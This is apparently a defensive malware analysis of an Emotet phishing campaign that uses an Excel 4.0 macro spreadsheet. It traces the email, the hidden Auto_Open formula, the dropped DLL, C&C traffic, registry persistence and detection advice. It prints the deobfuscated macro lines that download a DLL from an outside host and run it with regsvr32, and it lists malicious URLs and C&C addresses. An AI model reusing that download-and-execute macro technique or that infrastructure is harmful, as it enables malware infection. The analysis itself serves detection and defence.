# Malicious XLS Document (Emotet)

I have spotted this maliciously looking email targeting our support people and it get me wondering what it is all about. After detonation in the AnyRun sandbox, it was apparent that it is Emotet malware, but we haven't seen this type of Excel spreadsheet before. After a bit of Googling, it looked like this might be a new strain for which there is no deeper analysis publicly available, so I decided to do my own.

## Stage 01 - Email

The email itself is not a very good phishing attempt, it screams problems left and right, but I guess they are going for quantity, not quality. The interesting piece is the password protected zip attachment (basic techniques to bypass malicious file filtering).

![Alt text](data/emotet_email.png?raw=true "Email sample")

## Stage 02 - Malicious XLS document

So what are we dealing with?

```
└─$ file RVP664343444ZG.xls
RVP664343444ZG.xls: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1251, Author: Gydar, Last Saved By: Gydar, Name of Creating Application: Microsoft Excel, Create Time/Date: Fri Jun  5 19:19:34 2015, Last Saved Time/Date: Mon Nov  7 19:53:23 2022, Security: 0
```

![Alt text](data/document_sample.png?raw=true "Document details")
https://renenyffenegger.ch/notes/Windows/dirs/Program-Files/Microsoft-Office/root/Templates/index


Excel document uses the first line of all the sheets to show a fabricated message that relaunch is required, and the file needs to go to Templates folders [I'm an inline-style link](https://renenyffenegger.ch/notes/Windows/dirs/Program-Files/Microsoft-Office/root/Templates/index). This is a way how to get the macro executed within the file without user consent, but I have never seen this technique before. It is most probably a new technique employed as an answer for Microsoft’s recent default block of macros. [I'm an inline-style link](https://www.bleepingcomputer.com/news/microsoft/microsoft-starts-blocking-office-macros-by-default-once-again/#:~:text=The%20company%20announced%20in%20February,stage%20between%20April%20and%20June.)

Let's verify it with `olevba` what is inside the document, quite common is usage of Excel 4.0 macro.

```
└─$ olevba RVP664343444ZG.xls
olevba 0.60.1 on Python 3.10.5 - http://decalage.info/python/oletools
===============================================================================
FILE: RVP664343444ZG.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Shee
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet
' 0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, visible - Sheet
' 0018     29 LABEL : Cell Value, String Constant - _xlfn.SINGLE hidden len=2 ptgErr  *INCOMPLETE FORMULA PARSING* Remaining, unparsed expression: b'\x1d'
' 0018     58 LABEL : Cell Value, String Constant - built-in-name 1 Auto_Open len=7 ptgRef3d Sheet!G3
```

Bingo and Auto_Open function on top! Now, we can dig a little bit deeper and look for the function.

![Alt text](data/xls_hidden_field.png?raw=true "Hidden column")

`Auto_Open07457358934307593258350725798323209` points out to a hidden column. That holds a formula, which references data written with white colour all over the other sheets again to avoid immediate visual detection.

`=FORMULA(Sheet1!L24&Sheet1!L26&Sheet1!L27&Sheet1!L28&Sheet1!L28&Sheet2!F6&Sheet2!N19&Sheet1!F10&Sheet2!R3&Sheet5!Q21&Sheet2!F26&Sheet3!R13&Sheet5!E9&Sheet3!M26,G16)=FORMULA(Sheet1!L24&Sheet1!G8&Sheet1!F4&Sheet1!G8&Sheet1!L26&Sheet1!L30&Sheet1!F24&Sheet1!L26&Sheet3!F19&Sheet3!D5&Sheet1!A4&Sheet3!J14&Sheet1!A4&Sheet3!C32&Sheet1!F10&Sheet3!O23&Sheet3!P21&Sheet3!L8&Sheet5!E9&Sheet1!F24&Sheet1!L31,G18)=FORMULA(Sheet1!L24&Sheet1!L26&Sheet1!L27&Sheet1!L28&Sheet1!L28&Sheet2!F6&Sheet2!N19&Sheet1!F10&Sheet2!R3&Sheet5!Q21&Sheet2!G28&Sheet3!R13&Sheet5!G15&Sheet3!M26,G20)...=FORMULA(Sheet1!L24&Sheet1!G8&Sheet1!F4&Sheet1!G8&Sheet1!L26&Sheet1!L30&Sheet1!F24&Sheet1!L26&Sheet3!F19&Sheet3!D5&Sheet1!A4&Sheet3!J14&Sheet1!A4&Sheet3!C32&Sheet1!F10&Sheet3!O23&Sheet3!P21&Sheet3!L8&Sheet5!L12&Sheet1!F24&Sheet1!L31,G30)=FORMULA(Sheet1!L24&Sheet1!G44&Sheet1!H46&Sheet1!J44,G36)`

Let's deobfuscate the function and reconstruct the strings it produces.

```
"CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"https://cpcwiki[.]de/images/rirOpdztUEfG7WJ","..\oxnv1.ooccxx,0,0)
"EXEC("C:\Windows\System32\regsvre /S ..\oxnv1.ooccxx:")"
```

Four different domains were used to download four different ooccxx files. The following four URLs were used for downloading the malicious file.

```
hxxps://cpcwiki[.]de/images/rirOpdztUEfG7WJ
hxxp://www.atashelement[.]ir/qds-seo-url-autofill/tmSetsq0wxsmXdA/
hxxp://a.angel-tn.idv[.]tw/web_images/aa7fEDOPvT2F1i/
hxxps://www.conceptagency[.]net/css/zXC/
```

## Stage 03 - Dropped DLL


Only 3 URLs were online at the time of the analysis, delivering 3 distinct payloads.

```
└─$ file *            
index.html:      PE32+ executable (DLL) (GUI) x86-64, for MS Windows
index.html.1:    PE32+ executable (DLL) (GUI) x86-64, for MS Windows
rirOpdztUEfG7WJ: PE32+ executable (DLL) (GUI) x86-64, for MS Windows

└─$ sha1sum *                                                                                               
660d1f0186c9cfa862606b4c729a8881bb6f4d0e  index.html
20cab1b485c06201a387fd6d5d23d2083a5399e3  index.html.1
81474a672efeb9e620b012d2922b2ff067182cab  rirOpdztUEfG7WJ
```

The DLLs are using a proprietary packer. The main purpose of a packer is to compress and encrypt an executable as data inside another executable. Malware authors likes packers that make their payloads hard to detect antivirus products and the unpacking code difficult to analyze using a disassembler.

In our case all three binaries are with the same structure apart of the DATA part. It contains strings, which at a first glance looks like base64 encoded text, but it is most probably the encrypted payload.

![Alt text](data/base64_data.png?raw=true "Hidden column")

My free time, software equipment and skill reached their limit at this stage, so I decided to continue with dynamic analysis.

### C&C Traffic

After the dropped DLL execution, it initiates network connection to different IP addresses via ports `80, 8080, 443, and 4143`. The IP addresses are hard coded in the sample.

```
94.23.45.86:4143
187.63.160.88:80
167.172.199.165: 8080
182.162.143.56:443
```

The connections are encrypted with TLS, and all discovered C&C servers use the same TLS certificate to establish the secure channel.

```
version: v3 (2)
serialNumber: 0x00dea61ce54736a105
signature (sha256WithRSAEncryption)
Algorithm Id: 1.2.840.113549.1.1.11 (sha256WithRSAEncryption)
issuer: rdnSequence (0)
rdnSequence: 6 items (id-at-commonName=example.com,id-at-organizationalUnitName=IT Department,id-at-organizationName=Global Security,id-at-localityName=London,id-at-stateOrProvinceName=London,id-at-countryName=GB)
    RDNSequence item: 1 item (id-at-countryName=GB)
    RDNSequence item: 1 item (id-at-stateOrProvinceName=London)
    RDNSequence item: 1 item (id-at-localityName=London)
    RDNSequence item: 1 item (id-at-organizationName=Global Security)
    RDNSequence item: 1 item (id-at-organizationalUnitName=IT Department)
    RDNSequence item: 1 item (id-at-commonName=example.com)
```

As it turned out, the malware doesn’t use certificate pinning, so it is possible to MitM proxy the traffic to the C&C server and decrypt it.

![Alt text](data/mw_traffic.png?raw=true "Hidden column")

That doesn’t help us much in the research. We do see the structure of the request to the HTTP request C&C and that the Cookie header is used to forward the info from the victim to the C&C.  The base64 data there are encrypted by the malware, so it is not retrievable with dynamic analysis. The same can be said about the response from the C&C server. Anyways, such info could help write network signatures for appliances that can decrypt traffic.

### Persistence

When C&C is successfully contacted, the usual next move based on the dynamic analysis is to set up persistence on the victim’s machine. First dropped DLL makes a copy of itself to `%LocalAppData%` and afterwards sets up persistence via autorun value in the registry.

```
Key: HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN
Value: C:\WINDOWS\system32\regsvr32.exe "C:\Users\admin\AppData\Local\XtgMIR\gjTfZM.dll"
```

This ensures that the malware is executed after every reboot or start.

Now, the malware is ready to take the commands to gather info, install other modules, deploy ransomware, use for attack…

### DLL imported functions

DLL also imports the following functions.

```
KERNEL32.dll
  SetEndOfFile
  WriteConsoleW
  ExitProcess
  CreateEventW
  TlsAlloc
  TlsGetValue
  TlsSetValue
  TlsFree
  GetSystemTimeAsFileTime
  LoadLibraryExW
  HeapAlloc
  HeapReAlloc
  HeapFree
  WriteFile
  GetConsoleMode
  ReadFile
  FindFirstFileExW
  FindNextFileW
  GetCommandLineA
  GetCommandLineW
  CreateFileW
...
ole32.dll
  CoLoadLibrary
CRYPT32.dll
  CryptStringToBinaryA
```

It doesn’t exactly uncover all the functionality of the malware, but it can support some of our previous assumptions. `CryptStringToBinaryA` is commonly used to do encryption or encoding. We can also spot functions for file and memory manipulation and more.

## Infection Chain

This Emotet infection strain begins with a phishing e-mail delivered with Microsoft Office Excel attachment in a password-protected zip file. The Excel zip file contains Excel 4.0 macro, which downloads and executes an Emotet DLL. The DLL initiates a connection to C&C and waits for instructions.

![Alt text](data/infection_chain.png?raw=true "Hidden column")

## Impact

- Compromised system - with backdoor capabilities that can execute malicious commands
- Violation of user privacy - gathers and steals user credentials and data

## Protection

Now, from a blue team point of view, what should be the areas of focus for such cases.

#### T1566 - Phishing Email Detection

- Detect password-protected zip file in the attachment
- Detect SPAM/phishing look-a-like emails

Since malicious email delivery may not always be preventable, detection of Emotet at the earliest opportunity is the key to rapid containment and remediation.

### Endpoint Detection

#### T1566.001 – Phishing Attachment and Child Processes

- Detect malicious files based on signature
- Detect execution of Excel 4.0 macros
- Detect Office spawning subprocesses such as `CMD.exe, PowerShell*.exe, wscript.exe, cscript.exe, mshta.exe, wmic.exe, regsvr32.exe`

#### T1055.001 – Dynamic-link Library execution:

Emotet will use DLL packed with proprietary packer
- Detect execution of suspicious DLL
- Detect actions taken by the DLL

#### T1573.001 - C&C Encrypted Channel: Symmetric Cryptography

Network Monitoring - The detection ability on the network relies on breaking SSL. Without decryption, possible detection on the network is limited. It is possible to rely on the C&C IP address, but that is relatively broad with potential for FP and unwanted blocks.

## Prevention

- Awareness is the key. Users should always be vigilant when dealing with external emails and especially with external emails with attachments and also Office Documents.
- Have a safety net with AV and EDR.
- Adhere to the principle of least privilege, so you can significantly reduce the potential damage an attacker can inflict.

https://blog.reversinglabs.com/blog/excel-4.0-macros
https://www.optimizationcore.com/security/extract-vba-macro-from-microsoft-word-excel-oledump/
https://www.optimizationcore.com/security/excelsheetunhide-reveal-unhide-hidden-excel-sheets/
https://github.com/denk-core/ExcelSheetUnhide
https://www.zscaler.com/blogs/security-research/return-emotet-malware-analysis
https://www.proxifier.com/
